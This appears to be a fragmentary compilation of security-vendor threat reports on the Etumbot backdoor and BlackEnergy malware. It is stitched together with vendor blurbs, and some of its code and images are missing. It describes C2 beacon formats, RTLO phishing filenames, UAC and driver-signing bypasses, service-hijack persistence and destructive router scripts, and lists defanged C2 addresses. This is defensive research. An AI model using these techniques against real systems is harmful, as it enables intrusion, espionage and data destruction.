The company also develops a number of innovative software products used to monitor , detect and prevent emerging cyber threats .
The Group - IB team is made up of experts with unique skills and solid practical experience .
They are internationally certified by CISSP , CISA , CISM , CEH , CWSP , GCFA and also have information security state certificates .
In 2013 , computer secu- rity incident response team CERT - GIB operated by Group - IB became a member of FIRST - Forum of Incident Response and Security Teams .
In 2013 , the company became a member of the international cyber security alliance IMPACT ( In- ternational Multilateral Partnership Against Cyber Threats ) .
We are dedicated to our clients , our values , and our integrity .
Fox - IT delivers solutions before , during and after attacks .
It provides a layered intelligence approach : actionable data feeds into operational risk decision systems .
Real time threat information allows for tactical decisions and mitigation .
We base our intelligence around actor attribu- tion .
This angle drives a unique visibility on online threats - InTELL sees threats before they enter the botnet .
Information is delivered through our col- laboration portal , alerting , and through automated feeds powered by industry standard transports .
Arbor Threat Intelligence Brief 2014 - 07 ASERT Threat Intelligence , June 2014 Etumbot is a backdoor used in targeted attacks since at least March 2011 .
Although previous research has covered a related family , IXESHE , little has been discussed regarding Etumbot 's capabilities .
This report will provide information on the capabilities of Etumbot and associated campaign activity .
Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively known as `` Numbered Panda '' , APT12 , DYNCALC / CALC Team , and IXESHE .
Targeted campaigns attributed to this group include attacks on media , technology companies , and governments .
The group has reportedly been active since at least July 2009 .
The variety of names for this malware could lead to some confusion about the actual threat .
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .
Etumbot has two primary components .
The first is a dropper which contains the backdoor binary ( the second component ) and the distraction file .
Stage one is likely delivered via spear phish using an archive file extension such as .7z
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .
As with the IXESHE malware , Etumbot has been observed dropping documents of interest to a Taiwanese and Japanese target population .
To profile the techniques and capabilities of Etumbot , we will analyze an Etumbot dropper with MD5 ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4 , 2014 .
When executed , the dropper loads up a resource named `` BINARY '' from the resource section then creates the directory C : \Documents and Settings\User\Application Data\JAVA , then creates a temporary file C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C : \Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .
This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .
The backdoor component of the malware ( named here as JavaSvc.exe ) is now running .
It is interesting to note that versions of the IXESHE malware also used JavaSvc.exe as a filename .
Most Etumbot samples observed by ASERT drop decoy documents ( PDFs , Word Documents , and Excel Spreadsheets ) written in Traditional Chinese and usually pertaining to Cross - Strait or Taiwanese Government interests .
Several decoy files contain details on upcoming conferences in Taiwan .
Etumbot appears to be sent to targets via spear phishing emails as an archive ; ASERT has observed .7z
The archive filename will have a topic most likely of interest to the victim .
At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 , compiled in March 2014 ) uses a password - protected .7z
It is most likely that the spear phish email contained the password .
With the correct password , the victim has access to the dropper inside the archive .
This archive most likely included the installer d444be30d2773b23de38ead1f2c6d117 , as the filenames match ( 1030522 新 機關籌備小組清單.7z and 1030522 新機關籌備小組清單 rcs . DOC ) .
The calendar is based on the establishment of the rd Republic of China in 1911 .
The installer is a .scr
This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .
Right - to - Left Override After the files are extracted from the archive , the filenames of Etumbot installers make use of the right - to - left override ( RTLO ) trick in an attempt to trick users into clicking on the installer .
The RTLO technique is a simple way for malware writers to disguise names of malicious files .
A hidden Unicode character in the filename will reverse the order of the characters that follow it , so that a .scr
Threat actors using this trick have been well documented since at least 2009 .
These temp files appear to be static and used across multiple samples of Etumbot and IXESHE .
Various other samples were found using this same naming scheme .
Next , C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log is created , filled with contents of the bait / distraction file , and then copied to C : \DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc , which is then opened .
If Word is n't installed , then notepad will open the file instead .
The ka4281x3.log file is then deleted .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
The beacon takes the form of a GET request to /home / index.asp ? typeid = N where N is a randomly selected odd number between 1 and 13 .
If the C & C is online , the decoded response payload will contain the RC4 key that is used to encrypt subsequent communication .
If the C & C does not send a valid response , the bot will re - send the initial request every 45 seconds .
While the user - agent may appear to be legitimate , it only occurred 39 times in a corpus of over 61 million HTTP requests .
Due to the possibility of this User - Agent appearing in legitimate traffic , other indicators – such as the additional fake Referer value of http : //www.google.com should be present before compromise is assumed .
All of the headers in the HTTP request are hard - coded in both order and value , so they may be used to provide additional indicators of compromise .
If the C & C is online and responds to the beacon , then the RC4 key is delivered to the bot in a string of base64 encoded characters .
Etumbot uses a url - safe base64 alphabet , i.e. , any characters that would require URL - encoding are replaced .
Usage of base64 is a technique consistent with previous analysis done on IXESHE malware .
The payload from the C & C contains an 8-byte command code in little - endian format , followed by a null - terminated string argument if the command requires it .
In the case of the initial beacon response , the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C & C 's that ASERT has analyzed .
An example of this initial beacon and delivery of RC4 key is as follows .
The RC4 key can be obtained from the C & C response with the following python : While a payload of 1080 bytes is sent back , the majority appears to be random padding .
Once the bot has received the encryption key , the bot sends a registration callback to the C & C /image/ < encrypted data > .jpg
If a proxy is defined , communications to the C & C bypass the proxy and go directly to the Internet .
Environments with system - defined proxies wo n't get this activity in proxy logs , however transparent proxies may see this activity .
A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows : WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| Once the bot has registered with the C & C , it will send periodic pings to ask for new commands to execute .
The URI for the ping requests is /history/ < encrypted NetBIOS name > .asp
The first eight bytes of C & C responses to the bot include the command , and the second eight bytes contain an ASCII string that is parsed .
In the event of a file download , file upload , or command execution , the second eight bytes contain the filename or command to be executed .
The parsing function inside the binary reveals at least five commands : ETUM_CMD_EXEC provides the capability for the attacker to run any command on the compromised hosts .
Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the C & C using a separate thread that spawned during initialization .
In the event of a process creation or hang error , an HTTP transaction to /tech / s.asp / m= < message > is sent to the C & C , where < message > contains a create process error statement `` CreateProcess Error : % d '' or a message that states `` Process Do not exit in 10 second , so i Kill it ! '' .
Some samples of droppers have been observed using the string `` Process Do not cunzai in 10 second , so i Kill it ! '' .
The word `` cunzai '' is likely the pinyin ( romanization ) for the Mandarin word ' exist ' .
The file upload is accomplished by sending a request to /docs / name= < data > and the C & C is expected to respond with the full contents of the file as the response payload .
A success or failure status message is relayed via a call to /tech / s.asp ? m= < encrypted status message > with various reasons for failure potentially being relayed .
When a READFILE command is received from the C & C , the bot makes an initial call to /manage / asp / item.asp ? id= < encrypted computer name > & & mux= < encrypted total file size > and checks for the presence of `` I ' m Ready '' in the response from the C & C .
Data from the file is read in 2000 byte chunks , RC4 encrypted and then url - safe base64 encoded .
The data is sent back to the C & C via the URI /article/30441/Review.asp ? id= < encoded computer name > & & date= < file chunk data > .
The bot expects a message of `` OK '' from the C & C after each response is sent and will terminate the upload and send an error message to the C & C in the case it is not seen .
A success or failure message is sent via the /tech / s.asp ? m= < encrypted status message > to complete or terminate the upload .
When a bot receives the sleep command , it will relay the message , `` I will sleep % d minutes ! '' via a call to /tech / s.asp ? m= < encrypted message > .
Etumbot uses a technique to load strings into memory that has been called `` byte strings '' and also `` string stacking '' whereby character values are loaded into a specific memory location one byte at a time .
Assuming the string values do not change frequently , these byte strings can make for meaningful detection capabilities , such as discovering an unusual combination of characters ( to include typos , unique or odd syntax ) being loaded into memory that creates a unique fingerprint for the malware activity that can be used as part of a yara rule or other detection mechanism .
The byte string technique has been observed in various Chinese APT malware , including Gh0st RAT , IXESHE malware , Etumbot and others .
The first screenshot shows the default hex byte values that are MOVed into offsets from EBP , and the second screenshot shows those same characters after translation to string values .
Two additional screenshots provide insight into all of the strings discovered .
The byte string technique has also been observed in other malware , so its presence alone does not specifically indicate the activities of Chinese threat actors .
An interesting artifact occasionally observed during analysis is the presence of a numeric value just after an IP address used as a C & C .
The placement of this number after a colon suggests the use of a port value , however such a port value is too high to be valid .
An example of this taken from an Etumbot sample performing an initial beacon is as follows : 11 Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address hardcoded in the binary .
These C & C 's were obtained from analyzing malware samples compiled over a period of several years .
A number of these C & C IP addresses are also used by IXESHE - related malware , which seems to indicate that Etumbot is often used in tandem with IXESHE .
The domain finance [ .
The registrant for the domain yesplusno [ .
Other domains registered in this name have also been used as C & C for IXESHE : securezone [ .
This is the IP address for what appears to be a legitimate website for a school in Taiwan : intro.sunnyschool.com.tw .
Note that if HTran or other connection bouncer is used , the C & C may be a legitimate site that was simply compromised and used to direct traffic elsewhere .
Indicators suggest that HTran , a connection bouncer , is being used in some cases such as on the C & C contacted by malware sample MD5 : 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 , 2014 ) .
The presence of HTran is based on the following response string HTran is also called `` HUC Packet Transmit Tool '' , developed by a member of the Honker Union of China , a hacker group ; the source code for the program is available online .
The code in use here has been modified to not reveal such information .
Organizations properly positioned with netflow or other traffic analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial tier of C & C .
Htran activity can be detected with the following signature : ET CURRENT_EVENTS HTran / SensLiceld . A response to infected host The import hash for the sample observed connecting to an Htran bouncer is a9059c354e5025dfe4f1c0b8b57e4f62 which links to other Etumbot samples compiled with Microsoft Visual C++ 5.0 in a similar March 2014 timeframe : • 4c703a8cfeded7f889872a86fb7c70cf 2014 - 03 - 24 • ff5a7a610746ab5492cc6ab284138852 2014 - 03 - 04 The following samples have been identified by ASERT as Etumbot malware .
The first identified sample has a compilation date of March 2011 , while the most recent was compiled in May 2014 .
Many droppers / installers contain Etumbot or , alternatively , IXESHE - related backdoors .
Most of the documents dropped with Etumbot are written in traditional Chinese .
Traditional Chinese ( versus simplified Chinese used in mainland China ) is most widely used in Taiwan .
While other areas do make use of traditional Chinese ( Hong Kong , Macau ) , the topics of the decoy documents strongly suggest that Taiwanese entities are the targets for many Etumbot samples .
A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the Numbered Panda / IXESHE group has increased activity lately or has begun using Etumbot more widely in targeted campaigns .
This is a reflection of having both visibility and remediation capabilities at a majority of service provider networks globally .
This mission and the associated resources that Arbor Networks brings to bear to the problem of global Internet security is an impetus for innovation and research .
To view the latest research , news , and trends from Arbor , ASERT and the information security community at large , visit our Threat Portal at http : //www.arbornetworks.com / threats/ .
The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year .
An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms , scripts for Cisco network devices , destructive plugins , a certificate stealer and more .
Here , we present available data - it is difficult to collect on this APT .
We will also present more details on targets previously unavailable and present related victim profile data .
These attackers are careful to hide and defend their long - term presence within compromised environments .
The malware 's previously undescribed breadth means attackers present new technical challenges in unusual environments , including SCADA networks .
Challenges , like mitigating the attackers ' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .
Initially , cybercriminals used BlackEnergy custom plugins for launching DDoS attacks .
There are no indications of how many groups possess this tool .
Over time , BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor .
While another crimeware group continues to use BlackEnergy to launch DDoS attacks , the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own .
To be clear , our name for this actor has been the BE2 APT , while it has been called `` Sandworm Team '' also .
Before evidence of BlackEnergy2 use in targeted attacks was uncovered , we tracked strange activity on one of the BlackEnergy CnC servers in 2013 .
This strangeness was related to values listed in newer BlackEnergy configuration files .
As described in Dmitry 's 2010 Black DDoS ' analysis , a configuration file is downloaded from the server by main.dll on an infected system .
The config file provides download instructions for the loader .
It also instructs the loader to pass certain commands to the plugins .
In this particular case in 2013 , the config file included an unknown plugin set , aside from the usual ' ddos ' plugin listing .
Displayed below are these new , xml formatted plugin names `` weap_hwi '' , `` ps '' , and `` vsnet '' in a BlackEnergy configuration file download from a c2 server .
This new module push must have been among the first for this group , because all of the module versions were listed as `` version 1 '' , including the ddos plugin : The ' ps ' plugin turned out to be password stealer .
The ' vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .
Most surprising was the ' weap_hwi ' plugin .
It was a ddos tool compiled to run on ARM systems : At first , we did n't know whether the ARM plugin was listed intentionally or by mistake , so we proceeded to collect the CnC 's config files .
After pulling multiple config files , we confirmed that this ARM object inclusion was not a one - off mistake .
The server definitely delivered config files not only for Windows , but also for the ARM / MIPS platform .
Though unusual , the ARM module was delivered by the same server and it processed the same config file .
Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures .
All of these ARM / MIPS object files were compiled from the same source and later pushed out in one config : `` weap_msl '' , `` weap_mps '' , `` nm_hwi '' , `` nm_mps '' , `` weap_hwi '' , and `` nm_msl '' .
It 's interesting that the BE2 developers upgraded the ddos plugin to version 2 , along with the nm_hwi , nm_mps , and nm_msl plugins .
They simultaneously released version 5 of the weap_msl , weap_mps , and weap_hmi plugins .
Those assignments were not likely arbitrary , as this group had developed BlackEnergy2 for several years in a professional and organized style : Here is the list of retrieved files and related functionality : The developers ' coding style differed across the ' Hook ' main module , the plugins , and the Windows main.dll .
The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure .
This structure obfuscation may be a rewrite effort to better modularize the code , but could also be intended to complicate analysis .
Regardless , it is likely that different individuals coded the different plugins .
So , the BE2 effort must have its own small team of plugin and multiplatform developers .
After decrypting the strings , it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules : This Linux module can process the following commands , some of which are similar to the Windows version : After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs .
During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .
It appears the BE2/SandWorm gang protected their servers by keeping their non - Windows hacker tools and plugins in separate servers or server folders .
Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .
Here is the summary list of all known plugins at the moment : We are pretty sure that our list of BE2 tools is not complete .
For example , we have yet to obtain the router access plugin , but we are confident that it exists .
Evidence also supports the hypothesis that there is a decryption plugin for victim files ( see below ) .
Our current collection represents the BE2 attackers ' capabilities quite well .
Some plugins remain mysterious and their purpose is not yet clear , like ' usb ' and ' bios ' .
Why would the attackers need information on usb and bios characteristics ? It suggests that based on a specific USB and BIOS devices , the attackers may upload specific plugins to carry out additional actions .
Perhaps destructive , perhaps to further infect devices .
We do n't know yet .
It 's also interesting to point out another plugin – ' grc ' .
In some of the BE2 configuration files , we can notice an value with a `` gid '' type : This number is an ID for the plus.google.com service and is used by the ' grc ' plugin to parse html .
It then downloads and decrypts a PNG file .
The decrypted PNG is supposed to contain a new CNC address , but we never observed one .
We are aware of two related GooglePlus IDs .
The first one , plus.google.com/115125387226417117030/ , contains an abnormal number of views .
At the time of writing , the count is 75 million : The second one - plus.google.com/116769597454024178039/posts - is currently more modest at a little over 5,000 views .
All of that account 's posts are deleted .
During observation of the described above `` router - PC '' CnC we tracked the following commands delivered in the config file before the server went offline .
Our observation of related actions here : The issued commands for the Linux plugins suggest the attackers controlled infected MIPS / ARM devices .
We want to pay special attention to the DDoS commands meant for these routers .
While many researchers suspect a Russian actor is behind BE2 , judging by their tracked activities and the victim profiles , it 's still unclear whose interests they represent .
While observing some other CnCs and pulling down config files , we stumbled upon some strange mistakes and mis - typing .
They are highlighted in the image below : First , these mistakes suggest that the BE2 attackers manually edit these config files .
Secondly , it shows that even skilled hackers make mistakes .
The contents of the config files themselves are fairly interesting .
They all contain a callback c2 with a hardcoded ip address , some contain timeouts , and some contain the commands listed above .
We include a list of observed hardcoded ip C2 addresses here , along with the address owner and geophysical location of the host : It 's interesting that one of these servers is a Tor exit node .
And , according to the collected config files , the group upgraded their malware communications from plain text http to encrypted https in October 2013 .
We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 .
There are likely more victims .
Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden Victim profiles point to an expansive interest in ICS : power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors However , we also noticed that the target list includes government , property holding , and technology organizations as well : high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high - tech transportation academic research We gained insight into significant BE2 victim profiles over the summer of 2014 .
Interesting BE2 incidents are presented here .
The BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE , and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable .
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension .
The attached exe file turned out to be ' BlackEnergy - like ' malware , which researchers already dubbed ' BlackEnergy3 ' - the gang uses it along with BlackEnergy2 .
Kaspersky Lab detects ' BlackEnergy3 ' malware as Backdoor . Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first - stage tool on this network .
The config files within BE2 contained the settings of the company 's internal web proxy : As the APT - specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in - memory ) , the administrators were able to collect BE2 files from the infected machines .
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .
By all appearances , the attackers pushed the ' dstr ' module when they understood that they were revealed , and wanted to hide their presence on the machines .
Some machines already launched the plugin , lost their data and became unbootable .
Also , on some machines , documents were encrypted , but no related plugin could be found .
The second organization was hacked via the first victim 's stolen VPN credentials .
After the second organization was notified about the infection they started an internal investigation .
They confirmed that some data was destroyed on their machines , so the BE2 attackers have exhibited some level of destructive activity .
And , they revealed that their Cisco routers with different IOS versions were hacked .
They were n't able to connect to the routers any more by telnet and found the following `` farewell '' tcl scripts in the router 's file system : Ciscoapi.tcl – contains various wrappers over cisco EXEC - commands as described in the comments .
The comment includes a punchy message for `` kasperRsky '' : Killint.tcl – uses Ciscoapi.tcl , implements destroying functions : The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
The organization managed to discover what scripts were hosted on the server before BE / SandWorm gang deleted them , and unfortunately could n't restore them after they were deleted .
The BE2 actor performs careful , professional activity covering their tracks : ciscoapi.tcl killint.tcl telnetapi2.tcl telnetu.tcl stub.tcl stub1.tcl There is evidence that the logs produced by some scripts were also stored on the FTP server , in particular the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl .
The third organization got compromised by the same type of attack as the first one ( an EXE file spoofing a doc within a Zip archive ) .
All the plugins discovered in BE2 files were known , and there was no revelation of hacked network devices on their side and no destroyed data .
The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL : hxxps : //46.165.222 ( dot ) 28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains the md5 of the string ' router ' .
One of the discovered config files contained a URL with an as yet unidentified md5 : hxxps : //46.165.222 ( dot ) 28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .
Starting in March 2014 and ending in July 2014 , Siemens '' ccprojectmgr.exe '' downloaded and executed a handful of different payloads hosted at 94.185.85.122/favicon.ico .
They are all detected as variants of `` Backdoor . Win32.Blakken '' .
Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators .
Currently this particular BE / SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters , as follows : 0C0703hji The numbers indicate the date of file creation in the format : Year - Month - Day .
Still , the purpose of the letters is unknown , but most likely it indicates the targets .
The hex numbers were n't used all the time , sometimes we observed decimal numbers : 100914_mg 100929nrT Most interesting for us was the earliest build i d we could find .
Currently it is `` OB020Ad0V '' , meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 .
While BE dropper installs its driver under a randomly picked non - used Windows driver name , like % system32 % \drivers\AliIde.sys .
The driver is self - signed on 64-bit systems However , new `` APT '' BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings .
In the summer of 2014 , we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting .
These samples were identified as being the work of one group , referred to in this document as `` Quedagh '' , which has a history of targeting political organizations .
The Quedagh - related customizations to the BlackEnergy malware include support for proxy servers and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems .
While monitoring BlackEnergy samples , we also uncovered a new variant used by this group .
We named this new variant BlackEnergy 3 .
The use of BlackEnergy for a politically - oriented attack is an intriguing convergence of criminal activity and espionage .
As the kit is being used by multiple groups , it provides a greater measure of plausible deniability than is afforded by a custom- made piece of code .
F - SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper BlackEnergy is a popular crimeware ( that is , malware designed to automate criminal activities ) that is sold in the Russian cyber underground and dates back to as early as 2007 .
Originally , it was designed as a toolkit for creating botnets for use in conducting Distributed Denial of Service ( DDoS ) attacks .
Over time , the malware has evolved to support different plugins , which are used to extend its capabilities to provide necessary functions , depending on the purpose of an attack .
Given the nature of its toolkit , BlackEnergy has unsurprisingly been used by different gangs for different purposes ; some use it for sending spam , others for stealing banking credentials .
The most notorious use may be when it was used to conduct cyberattacks against Georgia during the Russo - Georgian confrontation in 2008 .
In the summer of 2014 , BlackEnergy caught our attention when we noticed that samples of it were now tailored to target Ukrainian government institutions .
Though it may be unrelated , it is interesting to note that this change conveniently coincides with the on - going crisis in that country .
Related or not , one thing is certain : the actor ( s ) using these customized BlackEnergy malware are intent on stealing information from the targets .
The use of this crimeware in what constitutes as an advance persistent threat ( APT ) attack is interesting .
In ' black operations ' ( black ops ) , an important criteria is that the attack should not be attributable - and what provides better plausible deniability than crimeware known to be used by multiple parties ? In this paper we focus only on BlackEnergy samples known to be used specifically by the actors we identify as Quedagh , who seem to have a particular interest in political targets .
Special focus will be on the samples that were used in targeted attacks against Ukrainian government organizations earlier this year .
An educated guess is that they are receiving the malware via targeted emails containing malicious attachments .
Meanwhile , the following infection and technical details are based on samples gathered after searching through F - Secure Labs ' collection of all BlackEnergy samples and identifying those with Quedagh characteristics .
The BlackEnergy toolkit comes with a builder application which is used to generate the clients that the attacker ( s ) use to infect victim machines .
The toolkit also comes with server - side scripts , which the attackers set up in the command and control ( C & C ) server .
The scripts also provide an interface where an attacker can control his bots .
The simplicity and convenience provided by the toolkit means that anyone who has access to the kit can build his own botnet without any skills required .
The original BlackEnergy toolkit first emerged in 2007 and is referred to in this paper as BlackEnergy 1 .
A later variant of the toolkit ( BlackEnergy 2 ) was released in 2010 .
We also encountered a previously unseen variant , which had been rewritten and uses a different format for its configuration .
It also no longer uses a driver component .
We dubbed this new variant BlackEnergy 3 .
Most of the recent BlackEnergy installers collected are named msiexec.exe .
We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer , or by documents containing exploits that silently perform the installation .
We found at least 2 trojanized legitimate applications that execute the installer ( in addition to their legitimate tasks ) .
Trojanization is an effective infection method , as most users have no way of observing that a malicious component is being installed in tandem with a legitimate program .
Some earlier installer variants , then named regedt32 .
These documents drop and execute the installer , then open a decoy document .
It is reasonable to assume that a similar approach has been used to deliver the more recent installer variants .
The installer filename of BlackEnergy 3 is still msiexec.exe .
However , it is delivered and executed by a dropper which opens a decoy document in the foreground .
We also encountered a standalone , non - persistent sample that pretends to be Adobe Flash Player Installer .
It does not use any decoy document or application and does not run after reboot .
The overview below summarizes the various infection vectors used by the Quedagh gang to deliver BlackEnergy crimeware to the designated targets .
From the very earliest variants we were able to attribute to Quedagh , we have noticed that their targets have been political in nature .
Apart from other indicators , we can deduce the nature of the target based on the content of social engineering tactics used to distribute the installers .
For example , one decoy dropped from a sample dating to 2012 ( image 2 ) seems to be targeting European audiences and discusses a political / economic situation .
Strings found in another sample from 2012 ( image 3 ) again indicate a political motivation behind the attack .
Most decoys used content taken from news sites ; we noted one decoy dropped by an exploit document was created using the Russian version of Office ( image 4 ) .
The latest variant of the dropper pretends to be a document file with a Ukrainian filename ( image 5 ) .
The choice of language for the filename again may tie in or reference the current political crisis in that country .
The filename itself means ' password list ' in English .
During our investigation , we found interesting details that lead us to suspect that Quedagh might have been involved in the cyberattacks launched against Georgia during the 2008 Russo - Georgian confrontation .
While the details identified are suggestive , they are not conclusive ; they do however seem consistent with the group 's involvement in subsequent targeted attacks .
While examining the samples collected during our BlackEnergy monitoring , we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C & C servers .
This contrasts with earlier BlackEnergy 2 variants , which do not support proxy servers .
In some network setups , a proxy server is needed to allow internal users to access the Internet .
For example , in one sample the configuration uses the proxy server associated with the Ukrainian Railway ( image 6 ) .
The configuration from another sample also shows it using an internal proxy under the giknpc domain ( image 7 ) .
The domain giknpc.com.ua in turn hosts 3 domains ( image 8 ) , one of which is for the city of Dnipropetrovsk ( image 9 ) , the fourth - largest city in Ukraine , located in the southeast .
Based on the set proxy servers for the different samples , we concluded that the gang is targeting Ukrainian government organizations .
Although they may have started much earlier , the earliest BlackEnergy sample we could attribute to the Quedagh gang is from December 14 , 2010 .
Initially , the group seemed to prefer to use the filename of the Windows registry editor ( regedt32.exe ) , presumably because the installer needs administrator rights to install its driver component and therefore would try to request for the highest available rights ( image 10 ) , if possible .
As this triggers a notification message visible to the user , said user is more likely to grant permission if it appears to be the registry editor that is requesting for permission , since it is normal to run it with administrator rights .
Experienced users though are less likely to be taken in , thereby decreasing the likelihood of a successful infection .
Starting April 2013 , modified installers appeared showing that the Quedagh group found a way to bypass the default User Account Control ( UAC ) settings .
With this change , the user 's permission is no longer need ( image 11 ) .
At this point , the gang also began to use the Windows installer program filename msiexec.exe .
Within a month of Windows 8.1 's release , the gang had quickly added support for 64-bit systems , possibly anticipating that more of their target systems will be migrated to 64-bit systems .
They also employ a neat trick to bypass the driver signing requirement on 64- bit Windows systems .
As a side note , this latest finding updates and supercedes previously published research related to BlackEnergy 's driver signing behavior .
However , this trick does n't work on Windows 8 and later systems .
The driver also crashes occassionally .
This could be the reason for the stand - alone non - persistent BlackEnergy variant .
We identified the new BlackEnergy 3 variant first by the change in its configuration , which differed from those of its two predecessors , 1 and 2 ( images 12 to 14 ) .
It also no longer uses a driver component [ 3 ] .
Further technical details are documented on page 10 to 11 .
The malware will only attempt to infect a system if the current user is a member of the local administrator group .
If not , it will re - launch itself as Administrator on Vista .
This in effect will trigger a UAC prompt .
On Windows 7 and later however , the malware will attempt to bypass the default UAC settings .
It exploits a backward - compatibility feature found in newer versions of Windows .
What harm can a volume control cause ? With the malicious `` fix '' installed however , executing SndVol.exe will execute the not - so - safe file cmd.exe instead , which can then be used to install the malware while in an elevated state .
The role of the installer is to set up the malware 's persistent component , which is the driver component .
On 64-bit Windows systems , Microsoft has enforced a policy that requires all drivers to be signed as a security precaution .
Signing provides a way to identify a driver to its author , effectively reducing the number of malware developers willing to take the risk .
To allow developers to test their drivers during development , Microsoft provides a TESTSIGNING boot configuration option ; while in this mode , a watermark is displayed on the screen to make it obvious to users and to prevent malware from exploiting this option .
In Windows 8 and up however , the strings are no longer stored in user32.dll.mui , so the trick will not work .
This may be one of the reasons for the existence of a standalone non- persistent BlackEnergy variant .
The malware does not infect 64-bit Windows systems that are older than Vista .
The installer will try to locate an existing driver service that is inactive .
The service found will usually be a legitimate one that is disabled because it is no longer used or because it is set to start only on demand .
The installer will drop the driver component using the corresponding path of the service .
It will overwrite the existing driver if necessary .
The hijacked service is then set to start automatically .
This is how the malware is able to survive after a reboot .
By doing this , the gang may be hoping that their malicious driver will be overlooked by administrators or investigators who are so used to seeing those legitimate services .
The only component that will remain permanently on the infected system will be the driver component .
The driver component used by the gang is a stripped down version of the BlackEnergy 2 driver .
The sole purpose of this driver component is to inject the main DLL component into svchost.exe .
Interestingly , it does not contain the rootkit functionalities for hiding processes , files and registry objects that is found in the usual BlackEnergy 2 drivers .
The gang may have opted for a ' hide in plain sight ' approach to evade detections from rootkit scanners , such as GMER and RootkitRevealer , that checks for system anomalies .
The driver component provides a IOCTL interface to communicate with the main DLL component .
Table 1 ( above ) summarizes the command codes that can be passed to the IOCTL buffer .
The 32-bit version contains additional , incomplete routines for hiding processes via direct kernel object manipulation ( DKOM ) and managing BlackEnergy 2 rootkit rules in memory .
Table 2 ( above ) summarizes the differences between the driver component used by Quedagh compared to the typical BlackEnergy 2 .
The core functionality of BlackEnergy 2 is found in the main DLL component .
This component is embedded inside the driver component and is not found in the file system ; this is to reduce the infection footprint on the system .
The main DLL provides a robust framework for attackers to maintain a botnet that is not tied to any specific functionality .
The malware is designed to be used by loading customized plugins depending on the purpose of the botmaster .
It is mainly a framework for plugins to communicate with a central command and control .
Otherwise , the main DLL only provides a minimal set of commands .
Table 3 ( above ) summarizes the commands supported by the variants used in the attack against Ukrainian government organizations .
In BlackEnergy 2 , the main DLL component communicates with its plugins via a defined set of API calls .
It exports a number of function calls , which can be used by the plugins .
On the other hand , plugins are required to export 2 functions to work .
We highly recommend the research of Dell SecureWorks for those looking for more details regarding the BlackEnergy 2 plugin framework .
In contrast to previous variants , BlackEnergy 3 uses a simpler installer component .
It does not have a driver component and the installer drops the main DLL component directly to the local application data ( non- roaming ) folder .
The installer then creates a LNK file in the startup folder , using a filename generated based on the volume serial number as a launch point .
The LNK file is a shortcut to execute the main DLL using rundll32.exe .
